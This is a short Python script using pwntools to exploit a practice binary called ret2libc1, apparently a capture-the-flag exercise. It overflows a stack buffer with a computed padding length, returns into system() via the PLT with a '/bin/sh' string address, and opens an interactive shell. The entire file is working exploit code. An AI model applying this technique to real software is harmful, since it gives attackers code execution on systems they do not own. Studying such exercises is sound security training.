from pwn import *

sh = process('./ret2libc1')
e = ELF('./ret2libc1')

bin_sh_addr = 0x8048720
system_addr = e.plt['system']
print('%x'%system_addr)

payload = flat([b'a'*(0xffffccc8-0xffffcc40-0x1c+4),
    system_addr, 0xb, bin_sh_addr])

sh.sendline(payload)
sh.interactive()

